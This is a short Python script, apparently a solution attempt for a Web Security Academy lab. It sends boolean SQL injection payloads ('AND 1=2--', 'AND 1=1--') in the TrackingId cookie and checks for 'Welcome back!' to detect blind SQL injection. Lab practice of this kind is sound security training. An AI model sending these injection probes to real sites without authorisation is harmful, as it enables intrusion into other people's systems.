import requests

url = "https://0a60003e04cae18782df6514004e0072.web-security-academy.net/"

def check(value):
	cookies = {'TrackingId':f"ztCkBZV5EpmhKetl'{value}"}
	response = requests.get(url,cookies=cookies)
	return "Welcome back!" in response.text

if check("AND 1=2--") is False and  check("AND 1=1--") is True :
	print("cookie header is vulnerble to blind sql injection")
	
else:
	print("cookie header is not")
 



